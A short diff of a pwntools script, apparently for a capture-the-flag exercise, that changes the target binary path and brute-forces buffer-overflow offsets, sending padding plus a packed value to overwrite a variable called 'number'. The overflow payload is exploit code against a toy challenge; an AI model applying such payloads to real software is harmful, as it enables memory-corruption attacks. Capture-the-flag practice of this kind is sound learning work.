@@ -3,7 +3,7 @@ from pwn import *
 for offset in range(32, 48, 4):  # Testing offsets around 32-48
     print(f"[*] Trying offset: {offset}")
     
-    p = process("./chall")
+    p = process("C:\smthshit\CTF\Finding-Offset\client")
     payload = b"A" * offset + p32(1337)  # Overwrite 'number'
     
     p.sendlineafter("Insert flag here: ", payload)
